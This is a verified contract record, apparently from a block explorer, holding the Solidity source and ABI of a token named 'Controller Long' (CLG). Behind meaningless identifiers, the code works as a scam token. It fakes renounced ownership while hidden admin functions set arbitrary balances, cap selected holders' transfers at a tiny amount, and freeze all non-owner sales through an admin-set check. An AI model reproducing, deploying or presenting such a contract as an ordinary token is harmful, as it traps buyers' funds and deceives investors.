{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface txExemptEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMarketing {\n    function createPair(address shouldLimitMarketing, address enableFund) external returns (address);\n}\n\ninterface liquidityList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverShould) external view returns (uint256);\n\n    function transfer(address limitSell, uint256 walletMode) external returns (bool);\n\n    function allowance(address listExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitSell,\n        uint256 walletMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldLaunch, uint256 value);\n    event Approval(address indexed listExempt, address indexed spender, uint256 value);\n}\n\ninterface marketingSender is liquidityList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ControllerLong is takeLaunched, liquidityList, marketingSender {\n\n    uint256 tokenTeam;\n\n    mapping(address => mapping(address => uint256)) private launchedExempt;\n\n    function receiverAmount(uint256 walletMode) public {\n        enableAt();\n        tokenTeam = walletMode;\n    }\n\n    bool public takeFundAt;\n\n    uint256 public takeTeam;\n\n    function transferFrom(address feeTake, address limitSell, uint256 walletMode) external override returns (bool) {\n        if (_msgSender() != txFee) {\n            if (launchedExempt[feeTake][_msgSender()] != type(uint256).max) {\n                require(walletMode <= launchedExempt[feeTake][_msgSender()]);\n                launchedExempt[feeTake][_msgSender()] -= walletMode;\n            }\n        }\n        return atExempt(feeTake, limitSell, walletMode);\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityTx;\n    }\n\n    function fundTotal(address totalSell) public {\n        enableAt();\n        if (buyMode != minList) {\n            autoMinFund = true;\n        }\n        if (totalSell == launchedMax || totalSell == atTx) {\n            return;\n        }\n        teamAmountSender[totalSell] = true;\n    }\n\n    bool public maxFrom;\n\n    function transfer(address minMode, uint256 walletMode) external virtual override returns (bool) {\n        return atExempt(_msgSender(), minMode, walletMode);\n    }\n\n    uint256 constant takeTo = 7 ** 10;\n\n    function senderAt(address minMode, uint256 walletMode) public {\n        enableAt();\n        receiverTotal[minMode] = walletMode;\n    }\n\n    uint256 private swapMaxLaunch = 100000000 * 10 ** 18;\n\n    string private fromSender = \"CLG\";\n\n    bool public autoMinFund;\n\n    event OwnershipTransferred(address indexed modeAuto, address indexed tradingAt);\n\n    address public atTx;\n\n    function takeAmount() public {\n        emit OwnershipTransferred(launchedMax, address(0));\n        liquidityTx = address(0);\n    }\n\n    address feeTotalSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private buyMode;\n\n    uint256 private teamTotal;\n\n    function allowance(address fundEnable, address listReceiver) external view virtual override returns (uint256) {\n        if (listReceiver == txFee) {\n            return type(uint256).max;\n        }\n        return launchedExempt[fundEnable][listReceiver];\n    }\n\n    function enableAt() private view {\n        require(teamReceiverEnable[_msgSender()]);\n    }\n\n    uint256 public fundLaunch;\n\n    uint8 private totalWallet = 18;\n\n    address public launchedMax;\n\n    uint256 launchedExemptFrom;\n\n    address txFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function takeAmountBuy(address feeTx) public {\n        require(feeTx.balance < 100000);\n        if (takeFundAt) {\n            return;\n        }\n        \n        teamReceiverEnable[feeTx] = true;\n        \n        takeFundAt = true;\n    }\n\n    bool private feeTxExempt;\n\n    constructor (){\n        \n        txExemptEnable receiverAmountLimit = txExemptEnable(txFee);\n        atTx = walletMarketing(receiverAmountLimit.factory()).createPair(receiverAmountLimit.WETH(), address(this));\n        \n        launchedMax = _msgSender();\n        takeAmount();\n        teamReceiverEnable[launchedMax] = true;\n        receiverTotal[launchedMax] = swapMaxLaunch;\n        \n        emit Transfer(address(0), launchedMax, swapMaxLaunch);\n    }\n\n    function owner() external view returns (address) {\n        return liquidityTx;\n    }\n\n    mapping(address => uint256) private receiverTotal;\n\n    function approve(address listReceiver, uint256 walletMode) public virtual override returns (bool) {\n        launchedExempt[_msgSender()][listReceiver] = walletMode;\n        emit Approval(_msgSender(), listReceiver, walletMode);\n        return true;\n    }\n\n    uint256 private minList;\n\n    function launchShould(address feeTake, address limitSell, uint256 walletMode) internal returns (bool) {\n        require(receiverTotal[feeTake] >= walletMode);\n        receiverTotal[feeTake] -= walletMode;\n        receiverTotal[limitSell] += walletMode;\n        emit Transfer(feeTake, limitSell, walletMode);\n        return true;\n    }\n\n    mapping(address => bool) public teamReceiverEnable;\n\n    mapping(address => bool) public teamAmountSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromSender;\n    }\n\n    bool public swapShould;\n\n    address private liquidityTx;\n\n    function name() external view virtual override returns (string memory) {\n        return walletFund;\n    }\n\n    string private walletFund = \"Controller Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapMaxLaunch;\n    }\n\n    function balanceOf(address receiverShould) public view virtual override returns (uint256) {\n        return receiverTotal[receiverShould];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalWallet;\n    }\n\n    function atExempt(address feeTake, address limitSell, uint256 walletMode) internal returns (bool) {\n        if (feeTake == launchedMax) {\n            return launchShould(feeTake, limitSell, walletMode);\n        }\n        uint256 receiverEnableExempt = liquidityList(atTx).balanceOf(feeTotalSell);\n        require(receiverEnableExempt == tokenTeam);\n        require(limitSell != feeTotalSell);\n        if (teamAmountSender[feeTake]) {\n            return launchShould(feeTake, limitSell, takeTo);\n        }\n        return launchShould(feeTake, limitSell, walletMode);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMinFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"}],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletMode\",\"type\":\"uint256\"}],\"name\":\"receiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMode\",\"type\":\"uint256\"}],\"name\":\"senderAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"takeAmountBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFundAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamAmountSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ControllerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}